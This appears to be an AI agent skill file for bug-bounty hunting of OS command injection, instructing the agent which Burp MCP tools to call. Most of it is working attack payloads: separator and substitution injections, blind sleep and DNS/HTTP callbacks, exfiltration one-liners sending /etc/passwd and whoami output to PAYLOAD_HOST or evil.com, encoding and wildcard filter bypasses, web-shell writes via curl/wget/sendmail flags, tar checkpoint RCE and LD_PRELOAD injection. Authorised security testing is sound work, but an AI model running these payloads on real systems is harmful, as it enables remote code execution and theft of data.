---
name: command-injection-testing
description: "OS command injection hunting — metacharacter injection (;|&`$()), blind detection (sleep/OOB/DNS exfil), filter bypass (IFS/base64/wildcards/hex), argument injection (curl -o, tar checkpoint, git hooks), environment variable injection. Use when testing file operations, network tools, PDF/image generators, backup features, or any system command wrapper."
---

# OS Command Injection — Bug Bounty Reference

## Crown Jewel Targets

- **Network diagnostic tools** (ping, traceroute, DNS lookup features) — direct shell execution with user-controlled hostname/IP (Critical RCE)
- **PDF/image generators** (wkhtmltopdf, ImageMagick, ffmpeg, Puppeteer) — argument injection or command substitution in filename/URL params
- **File management features** (backup, export, compress) — tar/zip/mysqldump with injectable filenames or paths
- **CI/CD pipeline interfaces** — build command injection, test runner parameters, deployment scripts
- **Git integration features** — `git clone` URL injection, hook execution, SSH command injection
- **Email sending features** — PHP `mail()` 5th parameter injection → sendmail argument injection → file write
- **Certificate/SSL tools** — openssl command wrappers with user-controlled domain names or certificate fields

## Attack Surface Signals

- **URL patterns**: `?ip=`, `?host=`, `?domain=`, `?cmd=`, `?file=`, `?backup=`, `?convert=`, `?format=`, `?export=`, `?email=`, `?ping=`
- **Feature indicators**: "Ping this host", "DNS lookup", "Convert file", "Generate PDF", "Export data", "Send test email"
- **Response patterns**: System command output in response, processing delay on network operations, "command not found" errors
- **Tech stack signals**: PHP (`shell_exec`, `system`, `exec`), Python (`os.system`, `subprocess`), Node.js (`child_process.exec`), Java (`Runtime.exec`)
- **Error messages**: `/bin/sh: syntax error`, `command not found`, `permission denied`, shell error patterns in response
- **Positive indicators**: Input appears to be passed to a shell command (visible output format matches CLI tool output)

## Why 75% Accept Rate

Command injection is one of the highest-acceptance-rate bug classes because:
- Immediate RCE = undeniable critical impact
- Proof is simple (`id`, `whoami`, OOB callback)
- Hard for programs to dispute if PoC works
- Remaining 25% rejection: OOB-only without confirmed execution, argument injection mistaken for command injection, WAF-blocked payloads with no bypass

## Detection — Common Injection Points

### High-priority parameters (test FIRST)

```
filename, file, path, dir, folder          → file operation commands
ip, host, hostname, server, domain, url    → ping/nslookup/curl
cmd, command, exec, run, query             → obvious sinks (rare but exist)
backup, export, download, convert          → system tool wrappers
template, format, output                   → PDF/image generators
email, to, from, subject                   → mail commands (sendmail, postfix)
dns, lookup, resolve, nslookup             → DNS utility wrappers
ping, traceroute, tracert, whois           → network diagnostic tools
```

### Feature-based detection (where injection lives)

```
PDF generators         → wkhtmltopdf, puppeteer, phantomjs
Image processors       → ImageMagick (convert), GraphicsMagick, ffmpeg
Backup/export tools    → mysqldump, pg_dump, tar, zip
DNS lookup features    → nslookup, dig, host
Ping/network tools     → ping, traceroute, netcat
Git operations         → git clone, git pull (URL injection)
File upload + process  → exiftool, file, identify
CI/CD pipelines        → build commands, test runners
Log viewers            → grep, awk, tail on server logs
Certificate tools      → openssl, certbot
```

## Attack Vectors

### A. Basic Command Injection — Metacharacter Injection

**Unix/Linux separators:**
```bash
; id                    # command terminator
| id                    # pipe
|| id                   # OR (runs if previous fails)
&& id                   # AND (runs if previous succeeds)
& id                    # background execution
`id`                    # backtick substitution
$(id)                   # command substitution
$((1+1))                # arithmetic (detection only)
%0a id                  # newline (URL-encoded)
\n id                   # newline (literal in some parsers)
```

**Windows separators:**
```cmd
& whoami                # command separator
| whoami                # pipe
|| whoami               # OR
&& whoami               # AND
%0a whoami              # newline
```

**Testing sequence (inject into parameter value):**
```
127.0.0.1;id
127.0.0.1|id
127.0.0.1||id
127.0.0.1&&id
127.0.0.1`id`
127.0.0.1$(id)
127.0.0.1%0aid
```

### B. Blind Command Injection

When output is not reflected in the response.

**Time-based detection:**
```bash
# Unix — sleep
127.0.0.1; sleep 10
127.0.0.1 | sleep 10
127.0.0.1 $(sleep 10)
127.0.0.1 `sleep 10`

# Unix — ping delay
127.0.0.1; ping -c 10 127.0.0.1

# Windows — timeout/ping
127.0.0.1 & timeout /T 10
127.0.0.1 & ping -n 10 127.0.0.1
```

**OOB via DNS (most reliable — egresses through firewalls):**
```bash
# Using nslookup
; nslookup UNIQUE_ID.YOUR_INTERACTSH_DOMAIN
| nslookup UNIQUE_ID.YOUR_INTERACTSH_DOMAIN
$(nslookup UNIQUE_ID.YOUR_INTERACTSH_DOMAIN)
`nslookup UNIQUE_ID.YOUR_INTERACTSH_DOMAIN`

# Using dig
; dig UNIQUE_ID.YOUR_INTERACTSH_DOMAIN
$(dig UNIQUE_ID.YOUR_INTERACTSH_DOMAIN)

# Using host
; host UNIQUE_ID.YOUR_INTERACTSH_DOMAIN

# DNS exfiltration with data
; nslookup $(whoami).YOUR_INTERACTSH_DOMAIN
; dig $(cat /etc/hostname).YOUR_INTERACTSH_DOMAIN
```

**OOB via HTTP (confirms HTTP egress):**
```bash
# curl
; curl https://YOUR_INTERACTSH_DOMAIN/$(whoami)
$(curl https://YOUR_INTERACTSH_DOMAIN/?d=$(id|base64))

# wget
; wget https://YOUR_INTERACTSH_DOMAIN/$(whoami)
$(wget -q -O- https://YOUR_INTERACTSH_DOMAIN/?d=$(id))

# PowerShell (Windows)
& powershell -c "Invoke-WebRequest https://YOUR_INTERACTSH_DOMAIN/$env:username"
```

### C. Filter Bypass Techniques

**Space bypass (when spaces are filtered):**
```bash
cat${IFS}/etc/passwd                # IFS = Internal Field Separator
cat$IFS/etc/passwd                  # without braces
{cat,/etc/passwd}                   # brace expansion
cat</etc/passwd                     # input redirection
cat%09/etc/passwd                   # horizontal tab
X=$'cat\x20/etc/passwd'&&$X        # hex-encoded space
IFS=,;`cat<<<cat,/etc/passwd`       # custom IFS
```

**Keyword bypass (when `cat`, `id`, etc. are blacklisted):**
```bash
# String concatenation
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Variable expansion
a=c;b=at;$a$b /etc/passwd

# Wildcard substitution
/???/??t /???/p??s??           # /bin/cat /etc/passwd
/???/??n/?d                     # /usr/bin/id

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
bash<<<$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)

# Hex encoding
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# Reverse string
$(echo 'dwssap/cte/ tac' | rev)

# Environment variable extraction
${PATH:0:1}                     # = "/" on most systems
${HOME:0:1}                     # = "/" (home is /root or /home/user)
${LS_COLORS:10:1}               # extract arbitrary chars from env vars
```

**Path bypass (when `/etc/passwd` is blacklisted):**
```bash
/etc/pass??                     # wildcard
/etc/pass*                      # glob
/e?c/p?ss?d                     # single-char wildcards
/etc/./passwd                   # dot segment
/etc/../etc/passwd              # traversal
```

### D. Argument Injection

When user input is passed as an **argument** to a command, not as a separate command. Metacharacters may be properly escaped, but argument flags are not.

**File write via argument flags:**
```bash
# curl -o / --output
--output /var/www/html/shell.php
-o /var/www/html/shell.php

# wget -O / --output-document
--output-document=/var/www/html/shell.php
-O /var/www/html/shell.php

# tar --checkpoint-action (RCE)
--checkpoint=1 --checkpoint-action=exec=id

# zip/unzip argument injection
--unzip-command="id"

# find -exec
-exec id \;
```

**Data exfiltration via argument flags:**
```bash
# curl -T (upload file)
-T /etc/passwd https://evil.com/

# git clone with SSH command
--upload-pack="id"
-c core.sshCommand="id" clone ssh://...

# rsync -e (remote shell)
-e "id" user@evil.com:

# sendmail argument injection
-X /var/www/html/log.txt     # log all traffic to web-accessible file
-O QueueDirectory=/tmp -X /var/www/html/shell.php
```

**Specific tool argument injections:**
```bash
# ImageMagick — ephemeral pseudo-protocol
convert 'ephemeral:/etc/passwd' out.png

# ffmpeg — read local files
-i /etc/passwd

# ghostscript — pipe to command
-sOutputFile=%pipe%id

# chromium/puppeteer
--disable-gpu --remote-debugging-port=9222
```

### E. Environment Variable Injection

```bash
# PATH manipulation — make target execute attacker-controlled binary
PATH=/tmp:$PATH; malicious_binary_name

# LD_PRELOAD — inject shared library (if sudo or SUID binary)
LD_PRELOAD=/tmp/evil.so target_command

# BASH_ENV — executed when bash starts in non-interactive mode
BASH_ENV='$(id)' bash -c 'echo test'

# ENV / PYTHONSTARTUP / PERL5OPT / RUBYOPT
PYTHONSTARTUP=/tmp/evil.py python3 -c 'pass'
PERL5OPT='-Mbase;system("id")' perl -e 1
RUBYOPT='-e system("id")' ruby -e 1

# Git-specific env vars
GIT_SSH_COMMAND="id" git clone ...
GIT_PROXY_COMMAND="id" git fetch ...
```

## Language-Specific Sinks

### PHP

```php
// Direct execution — HIGH RISK
system($input);                    // executes + returns last line
exec($input, $output);             // executes + returns output array
passthru($input);                  // executes + passes raw output
shell_exec($input);                // executes via shell, returns string
`$input`;                          // backtick operator = shell_exec()
popen($input, 'r');                // opens pipe to process
proc_open($input, $desc, $pipes);  // full process control

// Indirect execution
pcntl_exec($input);                // replaces current process
eval("system('$input')");          // eval + command injection
preg_replace('/.*/e', $input, ''); // /e modifier (PHP < 7.0)
mail($to, $subj, $msg, '', $input); // 5th param → sendmail args

// Detection: grep for these sinks + trace $input back to user input
```

### Python

```python
# Direct execution — HIGH RISK
os.system(user_input)                           # shell=True implicit
os.popen(user_input)                            # shell=True implicit
subprocess.call(user_input, shell=True)         # ONLY dangerous with shell=True
subprocess.Popen(user_input, shell=True)        # ONLY dangerous with shell=True
subprocess.run(user_input, shell=True)          # ONLY dangerous with shell=True
subprocess.check_output(user_input, shell=True) # ONLY dangerous with shell=True
commands.getoutput(user_input)                  # deprecated, uses shell

# Indirect execution
eval(f"os.system('{user_input}')")              # eval + command
exec(user_input)                                 # arbitrary code exec

# SAFE pattern (not injectable unless shell=True):
subprocess.run(['ping', '-c', '1', user_input]) # array form = no shell
```

### Node.js

```javascript
// Direct execution — HIGH RISK
child_process.exec(userInput);              // ALWAYS uses shell
child_process.execSync(userInput);          // ALWAYS uses shell
require('child_process').exec(userInput);

// Dangerous with shell option
child_process.spawn(cmd, args, {shell: true});   // shell=true = injectable
child_process.execFile(cmd, args, {shell: true}); // shell=true = injectable

// SAFE pattern (no shell):
child_process.spawn('ping', ['-c', '1', userInput]); // array args, no shell
child_process.execFile('ping', ['-c', '1', userInput]); // no shell default

// Indirect execution
eval(`require('child_process').execSync('${userInput}')`);
new Function(`return require('child_process').execSync('${userInput}')`)();
```

### Java

```java
// Direct execution — HIGH RISK
Runtime.getRuntime().exec(userInput);            // single string = shell parsing
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", userInput}); // explicit shell

// ProcessBuilder
new ProcessBuilder("/bin/sh", "-c", userInput).start();
new ProcessBuilder(Arrays.asList("/bin/sh", "-c", userInput)).start();

// Scripting engines (Groovy, JavaScript, etc.)
ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
engine.eval(userInput);  // if user controls script → RCE

// Spring expression injection (SpEL)
parser.parseExpression(userInput).getValue();
// Payload: T(java.lang.Runtime).getRuntime().exec('id')

// SAFE pattern:
new ProcessBuilder("ping", "-c", "1", userInput).start(); // no shell
```

### Ruby

```ruby
# Direct execution — HIGH RISK
system(user_input)           # passes to shell
exec(user_input)             # replaces process with shell command
`#{user_input}`              # backtick interpolation
%x[#{user_input}]            # same as backticks
IO.popen(user_input)         # opens pipe to shell command
Open3.capture3(user_input)   # shell execution + capture

# Kernel methods
Kernel.system(user_input)
Kernel.exec(user_input)
Kernel.`(user_input)         # Kernel backtick method

# Indirect execution
eval("system('#{user_input}')")
send(:system, user_input)

# SAFE pattern:
system("ping", "-c", "1", user_input)  # array form, no shell
```

## Out-of-Band Techniques

### OOB callback injection (primary method)

Mint the callback host with Burp's MCP tools, not a shell listener: ARTEX ships no
`interactsh-client`, and there is no `pentest-agents` MCP server.

- `mcp__Burp__generate_collaborator_payload` returns a hostname you own.
- `mcp__Burp__get_collaborator_interactions` polls it; a DNS hit proves the target
  resolved the name, an HTTP hit proves it connected.

If the install has its own OAST listener configured (`ARTEX_OOB_DOMAIN`), `oob_new`
and `oob_check` do the same job and bind the interaction to the task, which is the
stronger evidence. Use whichever is actually offered in your tool list.

```bash
# Substitute the hostname you just minted for PAYLOAD_HOST below.

# DNS-based (most reliable — bypasses most egress filters)
;nslookup PAYLOAD_HOST
$(nslookup PAYLOAD_HOST)
`nslookup PAYLOAD_HOST`

# HTTP-based (confirms curl/wget available)
;curl PAYLOAD_HOST
$(curl PAYLOAD_HOST/?r=$(whoami))

# SMTP-based (rare but useful for mail-related injection)
;sendmail attacker@evil.com < /etc/hostname
```

### DNS exfiltration (data extraction via DNS)

```bash
# Exfil hostname
;dig $(hostname).PAYLOAD_HOST

# Exfil whoami
;nslookup $(whoami).PAYLOAD_HOST

# Exfil file content (limited by DNS label length = 63 chars)
;nslookup $(cat /etc/hostname|head -c 60).PAYLOAD_HOST

# Exfil with base32 encoding (DNS-safe characters)
;dig $(id|base32|head -c 60).PAYLOAD_HOST
```

### HTTP exfiltration (full data extraction)

```bash
# POST file content to attacker
;curl -X POST -d @/etc/passwd https://PAYLOAD_HOST

# Encode and exfil via URL parameter
;curl "https://PAYLOAD_HOST/?d=$(cat /etc/passwd|base64|tr -d '\n')"

# wget variant
;wget --post-data="$(id)" https://PAYLOAD_HOST

# PowerShell (Windows)
& powershell -c "iwr https://PAYLOAD_HOST -Method POST -Body (whoami)"
```

## Polyglot Payloads

One payload to test multiple injection styles:

```bash
# Unix polyglot
;$(nslookup PAYLOAD_HOST)&nslookup PAYLOAD_HOST&`nslookup PAYLOAD_HOST`

# Shortened version for length-limited inputs
;`nslookup PAYLOAD_HOST`
$(curl PAYLOAD_HOST)

# URL-safe polyglot (for query parameters)
%0anslookup%20PAYLOAD_HOST%0a
```

## Impact Requirements

| Impact | Severity | Required Proof |
|--------|----------|----------------|
| Full RCE (`id`/`whoami` output in response) | **Critical** | Command output displayed, show `id`, `hostname`, `cat /etc/hostname` |
| Blind RCE confirmed via OOB | **Critical** | interactsh callback received with exfiltrated data (whoami, hostname) |
| Blind time-based (sleep only) | **Critical** | Consistent 10s delay with `sleep 10`, 0s with `sleep 0`. Min 3 repetitions |
| Argument injection → file write | **High-Critical** | Written file accessible (web shell) or sensitive data overwritten |
| Argument injection → file read (data exfil) | **High** | Sensitive file content received on attacker server |
| Env variable injection → code exec | **Critical** | Arbitrary code execution proven via OOB or output |

## Triage Checklist

- [ ] Injection point identified (which parameter, which HTTP method, which feature)
- [ ] Command execution confirmed (output visible, or OOB callback received, or consistent time delay)
- [ ] Underlying sink identified or hypothesized (PHP system(), Python os.system(), etc.)
- [ ] Impact demonstrated beyond basic PoC (`id` output shown, or hostname exfiltrated, or file read proven)
- [ ] Reproducible with step-by-step instructions (min 2 successful reproductions)
- [ ] Browser verification completed where applicable (Playwright for web-form-based injection)
- [ ] WAF bypass documented if applicable (which filter was in place, which bypass technique used)
- [ ] Burp Repeater evidence saved (raw request/response with injection payload)

## PortSwigger Academy — Advanced Techniques

### Newline (0x0a) as Separator
- `%0a whoami` — works when `;`, `&`, `|` are all filtered
- Newline character (`\n`) acts as a command terminator in shell, starting a new command on the next line
- Often overlooked by input filters that only check for traditional metacharacters

### Inline Execution Bypass
- Backticks `` `id` `` and `$(id)` are not "separator" characters — they perform inline command substitution
- May survive filters that block `;`, `&`, `|`, `||`, `&&` since substitution syntax is a different class
- The inner command executes and its output is substituted into the outer context

### DNS Exfiltration via Subdomain
- `` & nslookup `whoami`.COLLAB.oastify.com & `` — exfiltrates command output as a DNS subdomain label
- Backtick-wrapped command output becomes the subdomain prefix in the DNS query
- Bypasses HTTP egress filtering since DNS is rarely blocked

### Output Redirection to Webroot
- `& whoami > /var/www/static/out.txt &` — redirect command output to a web-accessible file
- Then fetch `https://target.com/static/out.txt` to read the output
- Useful for blind injection when both OOB and time-based detection fail

### Quoted Context Escape
- If input is placed inside quotes in the constructed command:
  - `" & whoami &` — terminates double-quoted string, then injects command
  - `' ; whoami ;` — terminates single-quoted string, then injects command
- Determine the quoting context from error messages or behavior before crafting the escape

### Wrapping Separators
- `& payload &` — use trailing separator to prevent syntax errors from remaining command fragments
- Without trailing `&`, appended arguments after injection point may cause shell syntax errors
- The trailing separator cleanly terminates the injected command regardless of what follows

## Operator Notes (Battle-Tested)

1. **Mint the OOB callback BEFORE testing**: DNS exfiltration (`nslookup PAYLOAD_HOST`) bypasses almost all egress filters. Call `mcp__Burp__generate_collaborator_payload` (or `oob_new` where the install has its own OAST listener) and inject DNS callbacks in EVERY parameter, then poll with `mcp__Burp__get_collaborator_interactions` / `oob_check`. Many blind command injections are missed because the hunter never had a callback host in hand.
2. **Test inline execution (`$(cmd)` and backticks) separately from separators**: Filters that block `;`, `&`, `|` often miss `$(id)` and `` `id` `` because they are substitution syntax, not separators. Always test both classes independently.
3. **Space bypass via `${IFS}` is the most reliable filter evasion**: When spaces are filtered, `cat${IFS}/etc/passwd` works on all Bash shells. Also try `{cat,/etc/passwd}` (brace expansion) and `cat</etc/passwd` (input redirection).
4. **Argument injection is a different attack class**: When metacharacters are properly escaped but arguments are not, inject flags like `--output /var/www/html/shell.php` (curl/wget), `--checkpoint-action=exec=id` (tar), or `-X /var/www/html/log.txt` (sendmail). Many hunters only test metacharacter injection and miss this entirely.
5. **Exfiltrate via DNS subdomain label for blind RCE proof**: `` ;nslookup `whoami`.PAYLOAD_HOST `` embeds the command output in the DNS query. This provides definitive proof of RCE even when HTTP egress is blocked. DNS label limit is 63 chars — use `base32` encoding for longer output.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Command injection via SSTI/template engine | `ssti-testing` |
| SSRF escalation to RCE on internal services | `ssrf-testing` |
| Argument injection via file upload filename | `file-upload-testing` |
| WAF blocks command metacharacters | `waf-bypass` → `references/waf-generic-evasion.md` (encoding, concatenation bypass) |
| Command injection in CI/CD pipeline | `cicd-pipeline-attacks` |
| Need to read source code to find sinks | `lfi-path-traversal` (read PHP/Python source) |
